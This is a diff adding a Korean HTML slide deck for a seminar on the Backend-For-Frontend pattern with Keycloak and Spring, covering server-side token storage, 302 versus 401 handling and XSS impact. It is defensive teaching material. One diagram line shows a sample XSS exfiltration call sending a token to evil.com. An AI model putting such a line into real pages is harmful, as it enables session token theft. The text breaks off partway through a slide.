@@ -1,0 +1,889 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>3회차 · BFF — 토큰을 브라우저에 두지 않기</title>
+<link rel="stylesheet" href="assets/slides.css">
+</head>
+<body>
+<main class="deck" data-deck="3회차 · BFF — 토큰을 브라우저에 두지 않기" data-index="index.html">
+
+<!-- 1. 제목 -->
+<section class="slide title">
+  <div class="kicker">에이전트 개발자를 위한 인증·인가 세미나 · 3회차</div>
+  <h1>BFF — 토큰을 브라우저에 두지 않기</h1>
+  <p class="sub">FE/BE 분리 구조에서 로그인과 토큰을 누가 맡는가</p>
+  <p class="meta">대상: Java/Spring 경험이 있는 에이전트 개발자 · 전제: 1·2회차(OIDC, Keycloak 토큰 발급·검증) · 50분</p>
+</section>
+
+<!-- 2. 복습 -->
+<section class="slide">
+  <h2>지난 시간 복습 — Keycloak이 발급하고, API가 검증한다</h2>
+  <div class="cols middle">
+    <div>
+      <ul>
+        <li><strong>Keycloak</strong>이 로그인을 맡고 서명된 <strong>JWT</strong>를 발급한다</li>
+        <li>호출자는 <code>Authorization: Bearer &lt;JWT&gt;</code> 헤더를 붙인다</li>
+        <li>API(<strong>Resource Server</strong>)는 Keycloak 공개키로 서명을 검증하고, 토큰 안의 역할로 허용 여부를 정한다</li>
+        <li>역할 검사는 <code>@PreAuthorize("hasRole('…')")</code> 한 줄, <code>aud</code> 검증은 직접 추가</li>
+        <li class="muted small">요청마다 Keycloak에 물어보지 않는다 — 토큰이 스스로 증명한다</li>
+      </ul>
+    </div>
+    <figure class="diagram">
+      <svg viewBox="0 0 560 200" role="img" aria-label="2회차 복습: 호출자가 Keycloak에서 받은 JWT를 Bearer로 보내면 API가 공개키로 서명을 검증하고 역할을 확인한다">
+        <rect x="200" y="10" width="160" height="44" rx="8" class="svg-idp"/>
+        <text x="280" y="38" text-anchor="middle" class="svg-text b">Keycloak</text>
+        <rect x="10" y="110" width="150" height="60" rx="10" class="svg-user"/>
+        <text x="85" y="145" text-anchor="middle" class="svg-text b">호출자</text>
+        <rect x="380" y="100" width="170" height="80" rx="10" class="svg-app"/>
+        <text x="465" y="124" text-anchor="middle" class="svg-text b">업무 API</text>
+        <text x="465" y="144" text-anchor="middle" class="svg-text xs muted">서명 검증 (JWKS 공개키)</text>
+        <text x="465" y="162" text-anchor="middle" class="svg-text xs muted">@PreAuthorize(roles)</text>
+        <path d="M100,110 L230,54" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="120" y="76" text-anchor="middle" class="svg-text xs">① 토큰 요청</text>
+        <path d="M260,54 L130,110" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <text x="228" y="98" text-anchor="middle" class="svg-text xs token">② JWT</text>
+        <path d="M160,140 L378,140" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <text x="269" y="131" text-anchor="middle" class="svg-text xs mono">③ Authorization: Bearer</text>
+        <path d="M440,100 L330,56" class="svg-line muted dashed" marker-end="url(#arrow-muted)"/>
+        <text x="420" y="72" text-anchor="middle" class="svg-text xs muted">공개키 조회 (캐시)</text>
+      </svg>
+      <figcaption>호출자가 누구든(사람의 앱, 에이전트) 이 모양은 같다. 오늘은 호출자가 <strong>브라우저</strong>일 때를 다룬다.</figcaption>
+    </figure>
+  </div>
+</section>
+
+<!-- 3. 목표 -->
+<section class="slide">
+  <h2>오늘의 목표</h2>
+  <ol class="steps">
+    <li><strong>302와 401을 구분</strong>해서 응답할 수 있다 — 페이지 요청과 API 요청은 로그인 유도 방식이 다르다</li>
+    <li><strong>BFF</strong>(Backend For Frontend)를 Spring으로 만들 수 있다 — 로그인 대행, 토큰 보관·중계·갱신, 세션, CSRF, 로그아웃</li>
+    <li>FE 담당자에게 넘길 <strong>최소 작업</strong>을 말할 수 있다 — 인터셉터 하나와 링크 두 개</li>
+  </ol>
+  <div class="card note mt">
+    <h3>이 회차가 끝나면</h3>
+    <p>"토큰을 브라우저에 둘까, 서버에 둘까"라는 질문에 근거를 갖고 답할 수 있고, 그 답을 Spring 설정 20줄로 옮길 수 있다.</p>
+  </div>
+</section>
+
+<!-- 4. 섹션 01 -->
+<section class="slide section">
+  <div class="num">01</div>
+  <h2>왜 필요한가</h2>
+  <p>FE/BE가 나뉘면 토큰은 누가 들고 있나</p>
+</section>
+
+<!-- 5. 문제 -->
+<section class="slide">
+  <h2>문제 — 토큰은 누가 들고 있나?</h2>
+  <div class="cols w-2-3 middle">
+    <div>
+      <ul>
+        <li>FE(SPA)와 BE(API)가 <strong>분리</strong>된 구조</li>
+        <li>로그인 화면은 Keycloak이 준다 (1·2회차)</li>
+        <li>남은 질문: 토큰을 <strong>누가 받아서 보관</strong>하고, API 호출에 <strong>붙이나</strong>?</li>
+        <li><strong>권한 검사는 BE에만.</strong> FE의 버튼 숨김은 편의일 뿐 — 개발자 도구로 바꾸거나 curl로 우회된다</li>
+      </ul>
+      <div class="card note">
+        <h3>오늘의 질문</h3>
+        <p>토큰을 <strong>브라우저</strong>에 둘 것인가, <strong>서버</strong>에 둘 것인가.</p>
+      </div>
+    </div>
+    <figure class="diagram">
+      <svg viewBox="0 0 700 360" role="img" aria-label="브라우저 SPA, BE API, Keycloak 사이에서 토큰을 누가 보관하고 붙일지 물음표가 찍힌 그림. FE를 거치지 않는 curl 호출도 API에 도달한다">
+        <rect x="260" y="10" width="180" height="52" rx="10" class="svg-idp"/>
+        <text x="350" y="42" text-anchor="middle" class="svg-text b">Keycloak</text>
+        <rect x="295" y="100" width="110" height="56" rx="10" class="svg-token"/>
+        <text x="350" y="122" text-anchor="middle" class="svg-text small b token">토큰</text>
+        <text x="350" y="146" text-anchor="middle" class="svg-text b token" style="font-size:21px">어디에?</text>
+        <path d="M350,62 L350,98" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <rect x="30" y="180" width="200" height="76" rx="10" class="svg-user"/>
+        <text x="130" y="211" text-anchor="middle" class="svg-text b">브라우저 (SPA)</text>
+        <text x="130" y="236" text-anchor="middle" class="svg-text small muted">React · Vue</text>
+        <rect x="470" y="180" width="200" height="76" rx="10" class="svg-app"/>
+        <text x="570" y="211" text-anchor="middle" class="svg-text b">BE 업무 API</text>
+        <text x="570" y="236" text-anchor="middle" class="svg-text small muted">Spring Resource Server</text>
+        <path d="M150,180 L290,62" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="128" y="120" text-anchor="middle" class="svg-text small">① 로그인은 누가 시작?</text>
+        <path d="M230,218 L468,218" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="350" y="208" text-anchor="middle" class="svg-text small">② 호출에 무엇을 붙이나?</text>
+        <text x="350" y="240" text-anchor="middle" class="svg-text small mono">Authorization: ???</text>
+        <rect x="30" y="300" width="200" height="46" rx="10" class="svg-user"/>
+        <text x="130" y="329" text-anchor="middle" class="svg-text small">curl · Postman (FE 없이)</text>
+        <path d="M230,323 L570,323 L570,258" class="svg-line bad dashed" marker-end="url(#arrow-bad)"/>
+        <text x="415" y="343" text-anchor="middle" class="svg-text small bad">③ FE를 안 거치는 호출도 온다 → 검사는 BE</text>
+      </svg>
+      <figcaption>로그인 화면은 Keycloak이 주지만, 토큰을 받고·보관하고·붙이는 쪽은 아직 정해지지 않았다.</figcaption>
+    </figure>
+  </div>
+  <aside class="notes">FE에서 role을 보고 메뉴를 숨기는 것은 UX. 보안 경계는 항상 BE. 이 전제를 먼저 못 박아야 "FE에 뭘 구현해야 하나"라는 질문이 작아진다.</aside>
+</section>
+
+<!-- 6. 선택지 A -->
+<section class="slide">
+  <h2>선택지 A — SPA가 토큰을 직접 보관한다</h2>
+  <div class="cols w-3-2 middle">
+    <figure class="diagram">
+      <svg viewBox="0 0 560 330" role="img" aria-label="SPA가 Keycloak에서 직접 토큰을 받아 브라우저 메모리에 보관하고 API에 붙이는 그림. XSS 스크립트 한 줄이 토큰을 외부로 보낼 수 있다">
+        <rect x="20" y="20" width="270" height="250" rx="12" class="svg-user"/>
+        <text x="155" y="48" text-anchor="middle" class="svg-text b">브라우저 (SPA)</text>
+        <rect x="40" y="64" width="230" height="36" rx="8" class="svg-app"/>
+        <text x="155" y="87" text-anchor="middle" class="svg-text small">keycloak-js · oidc-client-ts</text>
+        <rect x="40" y="116" width="230" height="66" rx="8" class="svg-token"/>
+        <text x="52" y="138" class="svg-text mono xs">access_token  = "eyJhbGci…"</text>
+        <text x="52" y="156" class="svg-text mono xs">refresh_token = "eyJhbGci…"</text>
+        <text x="52" y="174" class="svg-text xs muted">JS 메모리 — 어떤 스크립트든 읽는다</text>
+        <text x="155" y="214" text-anchor="middle" class="svg-text mono xs bad">fetch('https://evil.com/?t=' + token)</text>
+        <text x="155" y="236" text-anchor="middle" class="svg-text small bad">← XSS 한 줄이면 끝</text>
+        <rect x="380" y="270" width="160" height="44" rx="8" class="svg-bad-box"/>
+        <text x="460" y="297" text-anchor="middle" class="svg-text small bad b">evil.com (공격자)</text>
+        <path d="M155,246 L155,292 L378,292" class="svg-line bad dashed" marker-end="url(#arrow-bad)"/>
+        <text x="265" y="284" text-anchor="middle" class="svg-text xs bad">토큰 유출</text>
+        <rect x="380" y="20" width="160" height="50" rx="10" class="svg-idp"/>
+        <text x="460" y="50" text-anchor="middle" class="svg-text b">Keycloak</text>
+        <rect x="380" y="150" width="160" height="50" rx="10" class="svg-app"/>
+        <text x="460" y="180" text-anchor="middle" class="svg-text b">업무 API</text>
+        <path d="M290,38 L378,38" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="334" y="30" text-anchor="middle" class="svg-text xs">① code + PKCE</text>
+        <path d="M380,58 L292,58" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <text x="334" y="78" text-anchor="middle" class="svg-text xs token">② 토큰</text>
+        <path d="M290,170 L378,170" class="svg-line token" marker-end="url(#arrow-token)"/>
+        <text x="334" y="162" text-anchor="middle" class="svg-text xs mono">③ Bearer</text>
+      </svg>
+      <figcaption>토큰이 브라우저 JS 메모리에 있다. 브라우저는 secret을 숨길 수 없어 <strong>public 클라이언트</strong>로 등록된다.</figcaption>
+    </figure>
+    <div class="stack">
+      <div class="card ok"><h3>장점</h3><ul><li>서버가 상태를 갖지 않는다 (stateless)</li><li>BE는 2회차의 Resource Server 그대로</li><li>자료와 라이브러리가 많다</li></ul></div>
+      <div class="card bad"><h3>단점</h3><ul><li>토큰을 JS가 읽는다 → XSS 한 줄이면 유출</li><li>secret 없는 public client</li><li>refresh token까지 브라우저에 → 피해 기간이 길다</li></ul></div>
+      <p class="small muted"><strong>PKCE</strong>(Proof Key for Code Exchange): secret이 없는 클라이언트가 code 가로채기를 막는 장치. 1회차 참고.</p>
+    </div>
+  </div>
+  <aside class="notes">XSS가 "있으면 안 된다"는 건 맞지만, 서드파티 스크립트·마크다운 렌더링·에이전트가 생성한 HTML 등 SPA에서 XSS 가능성을 0으로 만들기는 어렵다. 그래서 토큰이 JS에 보이지 않는 구조가 필요하다.</aside>
+</section>
+
+<!-- 7. 선택지 B -->
+<section class="slide">
+  <h2>선택지 B — BFF가 토큰을 대신 들고 있는다</h2>
+  <figure class="diagram">
+    <svg viewBox="0 0 1136 300" role="img" aria-label="브라우저는 HttpOnly 세션 쿠키만 갖고, BFF 서버가 토큰을 세션에 보관해 업무 API와 에이전트 플랫폼에 Bearer로 전달하며, Keycloak과는 BFF가 직접 통신하는 그림">
+      <rect x="20" y="80" width="210" height="110" rx="12" class="svg-user"/>
+      <text x="125" y="112" text-anchor="middle" class="svg-text b">브라우저 (FE)</text>
+      <rect x="38" y="128" width="174" height="44" rx="8" class="svg-app"/>
+      <text x="125" y="146" text-anchor="middle" class="svg-text mono xs">Cookie: SESSION=3f9a…</text>
+      <text x="125" y="163" text-anchor="middle" class="svg-text xs muted">HttpOnly — JS가 못 읽음</text>
+      <rect x="400" y="50" width="300" height="170" rx="12" class="svg-app"/>
+      <text x="550" y="80" text-anchor="middle" class="svg-text b">BFF (Spring Boot)</text>
+      <rect x="420" y="96" width="260" height="108" rx="8" class="svg-token"/>
+      <text x="432" y="118" class="svg-text small b token">세션 저장소 (서버)</text>
+      <text x="432" y="140" class="svg-text mono xs">access_token  = "eyJ…"</text>
+      <text x="432" y="158" class="svg-text mono xs">refresh_token = "eyJ…"</text>
+      <text x="432" y="176" class="svg-text mono xs">id_token      = "eyJ…"</text>
+      <text x="432" y="195" class="svg-text xs muted">브라우저로 나가지 않는다</text>
+      <rect x="900" y="40" width="216" height="60" rx="10" class="svg-app"/>
+      <text x="1008" y="76" text-anchor="middle" class="svg-text b">업무 API</text>
+      <rect x="900" y="170" width="216" height="60" rx="10" class="svg-agent"/>
+      <text x="1008" y="206" text-anchor="middle" class="svg-text b">에이전트 플랫폼</text>
+      <rect x="450" y="246" width="200" height="48" rx="10" class="svg-idp"/>
+      <text x="550" y="276" text-anchor="middle" class="svg-text b">Keycloak</text>
+      <path d="M230,135 L398,135" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="314" y="126" text-anchor="middle" class="svg-text small">세션 쿠키만</text>
+      <text x="314" y="154" text-anchor="middle" class="svg-text xs muted">토큰 없음 · Authorization 헤더 없음</text>
+      <path d="M700,90 L898,72" class="svg-line token" marker-end="url(#arrow-token)"/>
+      <text x="796" y="64" text-anchor="middle" class="svg-text small token">Bearer 토큰 (중계)</text>
+      <path d="M700,180 L898,198" class="svg-line token" marker-end="url(#arrow-token)"/>
+      <text x="796" y="218" text-anchor="middle" class="svg-text small token">Bearer 토큰 (중계)</text>
+      <path d="M520,220 L520,244" class="svg-line idp" marker-end="url(#arrow-idp)"/>
+      <path d="M580,244 L580,220" class="svg-line token" marker-end="url(#arrow-token)"/>
+      <text x="505" y="238" text-anchor="end" class="svg-text xs muted">code · refresh</text>
+      <text x="595" y="238" class="svg-text xs token">토큰 발급·갱신</text>
+    </svg>
+    <figcaption>토큰은 BFF 서버에만 있다. 브라우저에는 세션 ID가 담긴 <strong>HttpOnly 쿠키</strong>뿐이다.</figcaption>
+  </figure>
+  <div class="row mt">
+    <div class="card note"><h3>BFF라는 말의 두 의미</h3><p class="small"><strong>원래</strong>: 웹·모바일 등 프런트엔드별 전용 백엔드(API 조합 계층). <strong>보안 패턴</strong>: 토큰을 서버가 대신 보관하는 OAuth BFF — IETF "OAuth 2.0 for Browser-Based Applications"가 가장 안전한 방식으로 권장. 오늘은 후자.</p></div>
+    <div class="card ok"><h3>핵심 한 줄</h3><p>브라우저에는 <strong>쿠키만</strong>, 토큰은 <strong>서버에</strong>. FE는 토큰을 본 적이 없다.</p></div>
+  </div>
+  <aside class="notes">BFF가 곧 업무 백엔드여도 된다(작은 시스템). API가 여러 개면 Gateway를 BFF로 둔다(슬라이드 18). 어느 쪽이든 "브라우저에 토큰이 없다"는 성질은 같다.</aside>
+</section>
+
+<!-- 8. BFF의 4가지 일 -->
+<section class="slide">
+  <h2>BFF가 하는 네 가지 일</h2>
+  <figure class="diagram">
+    <svg viewBox="0 0 1136 300" role="img" aria-label="BFF가 하는 네 가지 일: 로그인 대행, 토큰 보관, 토큰 중계, 토큰 갱신을 순서대로 보여주는 네 상자. 갱신된 토큰은 다시 보관으로 돌아간다">
+      <rect x="20" y="50" width="245" height="160" rx="12" class="svg-app"/>
+      <circle cx="46" cy="50" r="18" class="svg-num-bg"/><text x="46" y="56" text-anchor="middle" class="svg-num">1</text>
+      <text x="142" y="86" text-anchor="middle" class="svg-text b">로그인 대행</text>
+      <text x="142" y="116" text-anchor="middle" class="svg-text small">Keycloak으로 302, code 받기</text>
+      <text x="142" y="140" text-anchor="middle" class="svg-text small">code → 토큰 교환 (서버 간)</text>
+      <text x="142" y="164" text-anchor="middle" class="svg-text small">client secret 보유</text>
+      <text x="142" y="188" text-anchor="middle" class="svg-text small muted">= confidential client</text>
+
+      <rect x="305" y="50" width="245" height="160" rx="12" class="svg-app"/>
+      <circle cx="331" cy="50" r="18" class="svg-num-bg"/><text x="331" y="56" text-anchor="middle" class="svg-num">2</text>
+      <text x="427" y="86" text-anchor="middle" class="svg-text b">토큰 보관</text>
+      <text x="427" y="116" text-anchor="middle" class="svg-text small">access · refresh · id 토큰을</text>
+      <text x="427" y="140" text-anchor="middle" class="svg-text small">서버 세션에 저장</text>
+      <text x="427" y="164" text-anchor="middle" class="svg-text small">브라우저엔 HttpOnly 쿠키</text>
+      <text x="427" y="188" text-anchor="middle" class="svg-text small muted">JS가 읽을 수 없다</text>
+
+      <rect x="590" y="50" width="245" height="160" rx="12" class="svg-app"/>
+      <circle cx="616" cy="50" r="18" class="svg-num-bg"/><text x="616" y="56" text-anchor="middle" class="svg-num">3</text>
+      <text x="712" y="86" text-anchor="middle" class="svg-text b">토큰 중계</text>
+      <text x="712" y="116" text-anchor="middle" class="svg-text small">요청마다 세션에서 꺼내</text>
+      <text x="712" y="140" text-anchor="middle" class="svg-text small">Authorization: Bearer 추가</text>
+      <text x="712" y="164" text-anchor="middle" class="svg-text small">뒤쪽 API로 전달</text>
+      <text x="712" y="188" text-anchor="middle" class="svg-text small muted">= Token Relay</text>
+
+      <rect x="875" y="50" width="245" height="160" rx="12" class="svg-app"/>
+      <circle cx="901" cy="50" r="18" class="svg-num-bg"/><text x="901" y="56" text-anchor="middle" class="svg-num">4</text>
+      <text x="997" y="86" text-anchor="middle" class="svg-text b">토큰 갱신</text>
+      <text x="997" y="116" text-anchor="middle" class="svg-text small">만료 직전 refresh token으로</text>
+      <text x="997" y="140" text-anchor="middle" class="svg-text small">새 access token 받아 보관</text>
+      <text x="997" y="164" text-anchor="middle" class="svg-text small">세션이 사는 동안 반복</text>
+      <text x="997" y="188" text-anchor="middle" class="svg-text small muted">FE는 모른다</text>
+
+      <path d="M265,130 L303,130" class="svg-line" marker-end="url(#arrow)"/>
+      <path d="M550,130 L588,130" class="svg-line" marker-end="url(#arrow)"/>
+      <path d="M835,130 L873,130" class="svg-line" marker-end="url(#arrow)"/>
+      <path d="M997,210 L997,250 L427,250 L427,212" class="svg-line muted dashed" marker-end="url(#arrow-muted)"/>
+      <text x="712" y="243" text-anchor="middle" class="svg-text small muted">갱신된 토큰을 다시 보관</text>
+      <text x="568" y="288" text-anchor="middle" class="svg-text small b">네 가지 모두 BFF 안에서 일어난다 — FE 코드는 한 줄도 없다</text>
+    </svg>
+    <figcaption>Spring에서는 ①②④가 <code>oauth2Login()</code>과 <code>OAuth2AuthorizedClientManager</code>로, ③이 <code>TokenRelay</code> 또는 <code>RestClient</code> 인터셉터로 처리된다.</figcaption>
+  </figure>
+</section>
+
+<!-- 9. XSS 비교 -->
+<section class="slide">
+  <h2>XSS가 났을 때 — 무엇이 달라지나</h2>
+  <table>
+    <thead><tr><th style="width:20%">구분</th><th>SPA가 토큰 보관</th><th>BFF</th></tr></thead>
+    <tbody>
+      <tr><td>토큰 탈취</td><td class="bad">가능 — JS가 읽는다</td><td class="ok">불가 — HttpOnly 쿠키, JS가 못 읽는다</td></tr>
+      <tr><td>공격자가 쓰는 곳</td><td>어디서든 (훔친 토큰을 다른 PC에서 재사용)</td><td>피해자 브라우저 안에서만 (쿠키는 거기서만 자동 첨부)</td></tr>
+      <tr><td>피해 기간</td><td>토큰 만료까지, refresh token까지 털리면 더 길게</td><td>피해자가 그 페이지를 열어 둔 동안</td></tr>
+      <tr><td>서버에서 끊기</td><td>어렵다 — 토큰은 자체 검증</td><td>세션 삭제로 즉시</td></tr>
+      <tr><td>XSS 자체 방지</td><td>안 됨</td><td>안 됨 — 피해를 줄일 뿐</td></tr>
+    </tbody>
+  </table>
+  <div class="card warn mt">
+    <h3>BFF는 XSS를 막지 않는다. 피해를 줄인다.</h3>
+    <p>CSP, 출력 이스케이프, 에이전트가 생성한 HTML의 sanitize는 여전히 필요하다. BFF는 "뚫려도 토큰은 안 나간다"는 두 번째 방어선이다.</p>
+  </div>
+</section>
+
+<!-- 10. 섹션 02 -->
+<section class="slide section">
+  <div class="num">02</div>
+  <h2>로그인 흐름</h2>
+  <p>로그인 안 된 요청은 어떻게 Keycloak까지 갔다가 돌아오나</p>
+</section>
+
+<!-- 11. 전체 시퀀스 -->
+<section class="slide">
+  <h2>로그인 전체 흐름 — 401에서 200까지</h2>
+  <figure class="diagram">
+    <svg viewBox="0 0 1136 472" role="img" aria-label="브라우저 FE가 API에서 401을 받고 인터셉터로 BFF의 로그인 주소로 이동하면, BFF가 Keycloak으로 302를 보내고, 로그인 후 code를 받아 서버 간 통신으로 토큰을 교환해 세션 쿠키를 발급하고, 원래 페이지로 돌려보내 재호출이 200이 되는 순서">
+      <rect x="40" y="10" width="200" height="44" rx="8" class="svg-user"/>
+      <text x="140" y="38" text-anchor="middle" class="svg-text b">브라우저 (FE JS)</text>
+      <rect x="468" y="10" width="200" height="44" rx="8" class="svg-app"/>
+      <text x="568" y="38" text-anchor="middle" class="svg-text b">BFF (Spring)</text>
+      <rect x="896" y="10" width="200" height="44" rx="8" class="svg-idp"/>
+      <text x="996" y="38" text-anchor="middle" class="svg-text b">Keycloak</text>
+      <line x1="140" y1="54" x2="140" y2="466" class="svg-lifeline"/>
+      <line x1="568" y1="54" x2="568" y2="466" class="svg-lifeline"/>
+      <line x1="996" y1="54" x2="996" y2="466" class="svg-lifeline"/>
+
+      <path d="M140,90 L560,90" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="350" y="82" text-anchor="middle" class="svg-text small">① GET /api/agents (세션 쿠키 없음)</text>
+      <path d="M568,126 L148,126" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="358" y="118" text-anchor="middle" class="svg-text small">② 401 Unauthorized — API 요청이므로 302가 아니다</text>
+      <path d="M140,162 L560,162" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="350" y="154" text-anchor="middle" class="svg-text small">③ 인터셉터: location = /oauth2/authorization/keycloak</text>
+      <path d="M568,198 L148,198" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="358" y="190" text-anchor="middle" class="svg-text small">④ 302 → Keycloak /auth?client_id&amp;state&amp;code_challenge</text>
+      <path d="M140,234 L988,234" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="564" y="226" text-anchor="middle" class="svg-text small">⑤ 로그인 화면 (아이디 · 비밀번호 · MFA)</text>
+      <path d="M996,270 L148,270" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="572" y="262" text-anchor="middle" class="svg-text small">⑥ 302 → /login/oauth2/code/keycloak?code=…&amp;state=…</text>
+      <path d="M140,306 L560,306" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="350" y="298" text-anchor="middle" class="svg-text small">⑥′ GET /login/oauth2/code/keycloak?code=…</text>
+      <path d="M568,342 L988,342" class="svg-line idp" marker-end="url(#arrow-idp)"/>
+      <text x="778" y="334" text-anchor="middle" class="svg-text small idp">⑦ POST /token (code + client secret + code_verifier)</text>
+      <path d="M996,378 L576,378" class="svg-line token" marker-end="url(#arrow-token)"/>
+      <text x="786" y="370" text-anchor="middle" class="svg-text small token">⑦′ access · refresh · ID 토큰</text>
+      <path d="M568,414 L148,414" class="svg-line" marker-end="url(#arrow)"/>
+      <text x="358" y="406" text-anchor="middle" class="svg-text small">⑧ 세션 생성 → 302 원래 페이지 + Set-Cookie: SESSION (HttpOnly)</text>
+      <path d="M148,450 L560,450" class="svg-line ok" marker-start="url(#arrow-ok)" marker-end="url(#arrow-ok)"/>
+      <text x="354" y="442" text-anchor="middle" class="svg-text small ok">⑨ GET /api/agents (쿠키 자동 첨부) → 200 OK</text>
+
+      <rect x="640" y="76" width="330" height="66" rx="8" class="svg-token"/>
+      <text x="652" y="98" class="svg-text small b token">SSO 세션이 이미 있으면</text>
+      <text x="652" y="118" class="svg-text small">⑤ 화면 없이 바로 ⑥으로 →</text>
+      <text x="652" y="136" class="svg-text xs muted">사용자에겐 화면이 한 번 깜빡이는 정도</text>
+      <rect x="190" y="316" width="330" height="62" rx="8" class="svg-token"/>
+      <text x="202" y="336" class="svg-text small b token">⑦ ⑦′은 브라우저를 거치지 않는다</text>
+      <text x="202" y="354" class="svg-text xs">백 채널(서버 간). client secret은 BFF만 안다.</text>
+      <text x="202" y="370" class="svg-text xs">토큰이 URL·히스토리에 남지 않는다.</text>
+    </svg>
+    <figcaption>사용자 눈에는 "로그인 화면이 잠깐 떴다가 원래 화면으로 돌아오는 것". ④~⑧은 <code>oauth2Login()</code>이 전부 처리한다.</figcaption>
+  </figure>
+  <aside class="notes">③에서 FE가 직접 Keycloak 주소를 만들지 않는 점을 강조. FE는 BFF의 고정 경로(/oauth2/authorization/keycloak)만 안다. state·PKCE·redirect URI 조립은 전부 BFF. 1회차의 code flow가 그대로 들어 있다.</aside>
+</section>
+
+<!-- 12. 302 vs 401 -->
+<section class="slide">
+  <h2>302와 401 — 페이지 요청과 API 요청은 다르게 응답한다</h2>
+  <div class="cols">
+    <figure class="diagram">
+      <svg viewBox="0 0 540 250" role="img" aria-label="페이지 요청: 브라우저가 BFF에서 302를 받아 자동으로 Keycloak으로 이동한다">
+        <rect x="20" y="10" width="150" height="40" rx="8" class="svg-user"/><text x="95" y="36" text-anchor="middle" class="svg-text b">브라우저</text>
+        <rect x="215" y="10" width="130" height="40" rx="8" class="svg-app"/><text x="280" y="36" text-anchor="middle" class="svg-text b">BFF</text>
+        <rect x="390" y="10" width="130" height="40" rx="8" class="svg-idp"/><text x="455" y="36" text-anchor="middle" class="svg-text b">Keycloak</text>
+        <line x1="95" y1="50" x2="95" y2="235" class="svg-lifeline"/>
+        <line x1="280" y1="50" x2="280" y2="235" class="svg-lifeline"/>
+        <line x1="455" y1="50" x2="455" y2="235" class="svg-lifeline"/>
+        <path d="M95,90 L272,90" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="185" y="82" text-anchor="middle" class="svg-text small">GET /agents (주소창 · 링크)</text>
+        <path d="M280,140 L103,140" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="188" y="132" text-anchor="middle" class="svg-text small">302 Location: …keycloak…</text>
+        <path d="M95,190 L447,190" class="svg-line ok" marker-end="url(#arrow-ok)"/>
+        <text x="271" y="182" text-anchor="middle" class="svg-text small ok">브라우저가 알아서 따라간다 → 로그인 화면</text>
+        <text x="270" y="228" text-anchor="middle" class="svg-text b">페이지 요청 = 302</text>
+      </svg>
+      <figcaption>주소창 입력, 링크 클릭, form 전송. 브라우저가 이동을 책임진다.</figcaption>
+    </figure>
+    <figure class="diagram">
+      <svg viewBox="0 0 540 250" role="img" aria-label="API 요청: fetch가 BFF에서 401을 받으면 FE 인터셉터가 주소를 바꿔 페이지 이동을 일으킨다">
+        <rect x="20" y="10" width="150" height="40" rx="8" class="svg-user"/><text x="95" y="36" text-anchor="middle" class="svg-text b">FE JS (axios)</text>
+        <rect x="215" y="10" width="130" height="40" rx="8" class="svg-app"/><text x="280" y="36" text-anchor="middle" class="svg-text b">BFF</text>
+        <rect x="390" y="10" width="130" height="40" rx="8" class="svg-idp"/><text x="455" y="36" text-anchor="middle" class="svg-text b">Keycloak</text>
+        <line x1="95" y1="50" x2="95" y2="235" class="svg-lifeline"/>
+        <line x1="280" y1="50" x2="280" y2="235" class="svg-lifeline"/>
+        <line x1="455" y1="50" x2="455" y2="235" class="svg-lifeline"/>
+        <path d="M95,90 L272,90" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="185" y="82" text-anchor="middle" class="svg-text small">GET /api/agents (fetch · axios)</text>
+        <path d="M280,140 L103,140" class="svg-line" marker-end="url(#arrow)"/>
+        <text x="188" y="132" text-anchor="middle" class="svg-text small">401 Unauthorized</text>
+        <path d="M95,190 L447,190" class="svg-line ok" marker-end="url(#arrow-ok)"/>
+        <text x="271" y="182" text-anchor="middle" class="svg-text small ok">인터셉터가 location을 바꿈 → 페이지 요청이 됨</text>
+        <text x="270" y="228" text-anchor="middle" class="svg-text b">API 요청 = 401 + FE가 이동</text>
+      </svg>
+      <figcaption>fetch, axios, XMLHttpRequest. 이동은 FE 코드가 책임진다.</figcaption>
+    </figure>
+  </div>
+  <div class="card bad mt">
+    <h3>API 요청에 302를 주면?</h3>
+    <p class="small">fetch는 화면을 바꾸지 않고 백그라운드에서 302를 따라간다 → Keycloak 로그인 <strong>HTML</strong>을 JSON 대신 받아 파싱 오류, 또는 도메인이 달라 <strong>CORS</strong> 오류. 사용자 화면은 그대로다. 그래서 <code>/api/**</code>에는 401.</p>
+  </div>
+  <aside class="notes">실무에서 가장 많이 겪는 증상: "로그인 세션이 끊기면 화면이 멈추고 콘솔에 Unexpected token '&lt;' in JSON". 원인은 API 경로에 302가 나가는 것. Spring 기본값이 302라서 EntryPoint 분기(슬라이드 17)가 필요하다.</aside>
+</section>
+
+<!-- 13. 401/403 루프 -->
+<section class="slide">
+  <h2>함정 — 403에 로그인 리다이렉트를 하면 무한 루프</h2>
+  <div class="cols w-3-2 middle">
+    <figure class="diagram">
+      <svg viewBox="0 0 560 320" role="img" aria-label="403을 받고 로그인 페이지로 보내면 SSO 세션 때문에 즉시 돌아와 다시 403을 받는 무한 루프">
+        <rect x="180" y="12" width="200" height="60" rx="10" class="svg-app"/>
+        <text x="280" y="36" text-anchor="middle" class="svg-text small b">① API 호출 → 403</text>
+        <text x="280" y="56" text-anchor="middle" class="svg-text xs muted">로그인은 됐지만 권한 없음</text>
+        <rect x="360" y="130" width="190" height="60" rx="10" class="svg-bad-box"/>
+        <text x="455" y="154" text-anchor="middle" class="svg-text small b bad">② 로그인 주소로 이동</text>
+        <text x="455" y="174" text-anchor="middle" class="svg-text xs bad">← 잘못된 처리</text>
+        <rect x="180" y="248" width="200" height="60" rx="10" class="svg-idp"/>
+        <text x="280" y="272" text-anchor="middle" class="svg-text small b">③ Keycloak: SSO 세션 있음</text>
